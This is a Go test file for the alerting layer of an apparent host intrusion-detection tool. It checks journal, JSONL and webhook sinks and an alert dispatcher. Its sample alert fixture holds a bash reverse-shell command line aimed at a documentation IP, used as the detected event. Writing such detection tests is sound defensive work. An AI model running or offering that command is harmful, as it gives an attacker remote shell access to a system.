package alert

import (
	"bytes"
	"encoding/json"
	"errors"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/conor-sometimes/banken/internal/event"
)

func sampleAlert(level string) Alert {
	return Alert{
		Time:    time.Date(2026, 10, 31, 12, 0, 0, 0, time.UTC),
		Kind:    KindSigma,
		Rule:    "reverse_shell",
		Title:   "Reverse shell spawned",
		Level:   level,
		Source:  "auditd",
		Message: "rule matched",
		Event:   event.Event{Image: "/bin/bash", CommandLine: "bash -i >& /dev/tcp/192.0.2.1/4444", User: "u"},
	}
}

func TestJournalSinkJournalsOnlyHighAndCritical(t *testing.T) {
	var buf bytes.Buffer
	j := NewJournalSink(&buf)
	for _, lvl := range []string{"low", "medium", "high", "critical"} {
		if err := j.Emit(sampleAlert(lvl)); err != nil {
			t.Fatalf("Emit(%s): %v", lvl, err)
		}
	}
	out := buf.String()
	lines := nonEmptyLines(out)
	if len(lines) != 2 {
		t.Fatalf("expected 2 journalled lines (high, critical), got %d:\n%s", len(lines), out)
	}
	// critical -> daemon.crit = 3*8+2 = 26; high -> daemon.err = 3*8+3 = 27
	if !strings.HasPrefix(lines[0], "<27>") {
		t.Errorf("high line priority wrong: %q", lines[0])
	}
	if !strings.HasPrefix(lines[1], "<26>") {
		t.Errorf("critical line priority wrong: %q", lines[1])
	}

	if err := j.Close(); err != nil {
		t.Fatalf("Close: %v", err)
	}
	summary := buf.String()[len(out):]
	if !strings.Contains(summary, "4 alert(s)") || !strings.Contains(summary, "high=1") || !strings.Contains(summary, "critical=1") {
		t.Errorf("summary line unexpected: %q", summary)
	}
}

func TestJournalSinkCloseNoAlertsIsSilent(t *testing.T) {
	var buf bytes.Buffer
	j := NewJournalSink(&buf)
	if err := j.Close(); err != nil {
		t.Fatalf("Close: %v", err)
	}
	if buf.Len() != 0 {
		t.Errorf("expected no output with zero alerts, got %q", buf.String())
	}
}

func TestJSONLSinkWritesPerDayAndMarshals(t *testing.T) {
	dir := t.TempDir()
	s, err := NewJSONLSink(dir, 30)
	if err != nil {
		t.Fatalf("NewJSONLSink: %v", err)
	}
	a := sampleAlert("high")
	if err := s.Emit(a); err != nil {
		t.Fatalf("Emit: %v", err)
	}
	if err := s.Emit(a); err != nil {
		t.Fatalf("Emit 2: %v", err)
	}
	path := filepath.Join(dir, "alerts-2026-10-31.jsonl")
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("read alert file: %v", err)
	}
	lines := nonEmptyLines(string(data))
	if len(lines) != 2 {
		t.Fatalf("expected 2 jsonl lines, got %d", len(lines))
	}
	var got Alert
	if err := json.Unmarshal([]byte(lines[0]), &got); err != nil {
		t.Fatalf("alert line is not valid JSON: %v", err)
	}
	if got.Rule != "reverse_shell" || got.Event.Image != "/bin/bash" {
		t.Errorf("round-tripped alert wrong: %+v", got)
	}
}

func TestJSONLSinkRetentionPrunesOldFiles(t *testing.T) {
	dir := t.TempDir()
	// Seed an old file and a recent one.
	old := filepath.Join(dir, "alerts-2020-01-01.jsonl")
	recent := filepath.Join(dir, "alerts-"+time.Now().UTC().Format("2006-01-02")+".jsonl")
	if err := os.WriteFile(old, []byte("{}\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(recent, []byte("{}\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	// A non-alert file must be untouched.
	keep := filepath.Join(dir, "notes.txt")
	if err := os.WriteFile(keep, []byte("x"), 0o600); err != nil {
		t.Fatal(err)
	}

	if _, err := NewJSONLSink(dir, 30); err != nil { // prunes on construction
		t.Fatalf("NewJSONLSink: %v", err)
	}
	if _, err := os.Stat(old); !errors.Is(err, os.ErrNotExist) {
		t.Errorf("old file should have been pruned, stat err = %v", err)
	}
	if _, err := os.Stat(recent); err != nil {
		t.Errorf("recent file should remain: %v", err)
	}
	if _, err := os.Stat(keep); err != nil {
		t.Errorf("non-alert file should remain: %v", err)
	}
}

func TestJSONLSinkRetentionZeroKeepsEverything(t *testing.T) {
	dir := t.TempDir()
	old := filepath.Join(dir, "alerts-2000-01-01.jsonl")
	if err := os.WriteFile(old, []byte("{}\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := NewJSONLSink(dir, 0); err != nil {
		t.Fatalf("NewJSONLSink: %v", err)
	}
	if _, err := os.Stat(old); err != nil {
		t.Errorf("retention 0 should keep file: %v", err)
	}
}

func TestWebhookSinkGenericAndSlack(t *testing.T) {
	var gotBody []byte
	var gotType string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		gotBody, _ = io.ReadAll(r.Body)
		gotType = r.Header.Get("Content-Type")
		w.WriteHeader(http.StatusOK)
	}))
	defer srv.Close()

	// generic: full Alert JSON
	ws, err := NewWebhookSink(WebhookConfig{URL: srv.URL, Style: StyleGeneric})
	if err != nil {
		t.Fatalf("NewWebhookSink: %v", err)
	}
	if err := ws.Emit(sampleAlert("critical")); err != nil {
		t.Fatalf("Emit: %v", err)
	}
	var a Alert
	if err := json.Unmarshal(gotBody, &a); err != nil {
		t.Fatalf("generic body not Alert JSON: %v (%s)", err, gotBody)
	}
	if a.Rule != "reverse_shell" {
		t.Errorf("generic body rule = %q", a.Rule)
	}
	if gotType != "application/json" {
		t.Errorf("content-type = %q", gotType)
	}

	// slack: {"text": ...}
	ws, _ = NewWebhookSink(WebhookConfig{URL: srv.URL, Style: StyleSlack})
	if err := ws.Emit(sampleAlert("critical")); err != nil {
		t.Fatalf("Emit slack: %v", err)
	}
	var slack map[string]string
	if err := json.Unmarshal(gotBody, &slack); err != nil {
		t.Fatalf("slack body not JSON: %v", err)
	}
	if !strings.Contains(slack["text"], "Reverse shell spawned") {
		t.Errorf("slack text = %q", slack["text"])
	}

	// ocsf: the bare Detection Finding, application/json, carrying the
	// configured hostname.
	ws, _ = NewWebhookSink(WebhookConfig{URL: srv.URL, Style: StyleOCSF, OCSF: testOpts})
	if err := ws.Emit(sampleAlert("critical")); err != nil {
		t.Fatalf("Emit ocsf: %v", err)
	}
	var f OCSFFinding
	if err := json.Unmarshal(gotBody, &f); err != nil {
		t.Fatalf("ocsf body not JSON: %v (%s)", err, gotBody)
	}
	if f.ClassUID != 2004 || f.FindingInfo.Analytic.Name != "reverse_shell" || f.Device == nil || f.Device.Hostname != "golden-host" {
		t.Errorf("ocsf body = class %d analytic %q device %+v", f.ClassUID, f.FindingInfo.Analytic.Name, f.Device)
	}
	if gotType != "application/json" {
		t.Errorf("ocsf content-type = %q", gotType)
	}
}

func TestWebhookSinkReadsURLFromFile(t *testing.T) {
	var hit bool
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		hit = true
		w.WriteHeader(http.StatusOK)
	}))
	defer srv.Close()

	dir := t.TempDir()
	urlFile := filepath.Join(dir, "url")
	if err := os.WriteFile(urlFile, []byte(srv.URL+"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	ws, err := NewWebhookSink(WebhookConfig{URLFile: urlFile})
	if err != nil {
		t.Fatalf("NewWebhookSink: %v", err)
	}
	if err := ws.Emit(sampleAlert("high")); err != nil {
		t.Fatalf("Emit: %v", err)
	}
	if !hit {
		t.Error("server was not hit")
	}
}

func TestWebhookSinkErrors(t *testing.T) {
	if _, err := NewWebhookSink(WebhookConfig{}); err == nil {
		t.Error("expected error with no urlFile and no url")
	}
	if _, err := NewWebhookSink(WebhookConfig{URLFile: "/nonexistent/path/xyz"}); err == nil {
		t.Error("expected error reading nonexistent urlFile")
	}

	// non-2xx response is an error
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusInternalServerError)
	}))
	defer srv.Close()
	ws, _ := NewWebhookSink(WebhookConfig{URL: srv.URL})
	if err := ws.Emit(sampleAlert("high")); err == nil {
		t.Error("expected error on 500 response")
	}
}

// --- dispatcher ---

type recordingSink struct {
	name   string
	got    []Alert
	failOn string // return an error when alert.Level == failOn
}

func (r *recordingSink) Name() string { return r.name }
func (r *recordingSink) Emit(a Alert) error {
	r.got = append(r.got, a)
	if a.Level == r.failOn {
		return errors.New("boom")
	}
	return nil
}
func (r *recordingSink) Close() error { return nil }

func TestDispatcherFansOutAndCollectsErrors(t *testing.T) {
	s1 := &recordingSink{name: "a"}
	s2 := &recordingSink{name: "b", failOn: "high"}
	d := NewDispatcher(s1, s2)

	errs := d.Dispatch(sampleAlert("high"))
	if len(s1.got) != 1 || len(s2.got) != 1 {
		t.Fatalf("both sinks should receive the alert: s1=%d s2=%d", len(s1.got), len(s2.got))
	}
	if len(errs) != 1 {
		t.Fatalf("expected 1 error (from s2), got %d", len(errs))
	}
}

type recordingResponder struct{ got []Alert }

func (r *recordingResponder) Respond(a Alert) error {
	r.got = append(r.got, a)
	return nil
}

func TestDispatcherResponderRunsBeforeSinks(t *testing.T) {
	resp := &recordingResponder{}
	sink := &recordingSink{name: "a"}
	d := NewDispatcher(sink)
	d.SetResponder(resp)
	d.Dispatch(sampleAlert("critical"))
	if len(resp.got) != 1 {
		t.Fatalf("responder should have been called once, got %d", len(resp.got))
	}
}

func nonEmptyLines(s string) []string {
	var out []string
	for _, l := range strings.Split(s, "\n") {
		if strings.TrimSpace(l) != "" {
			out = append(out, l)
		}
	}
	return out
}
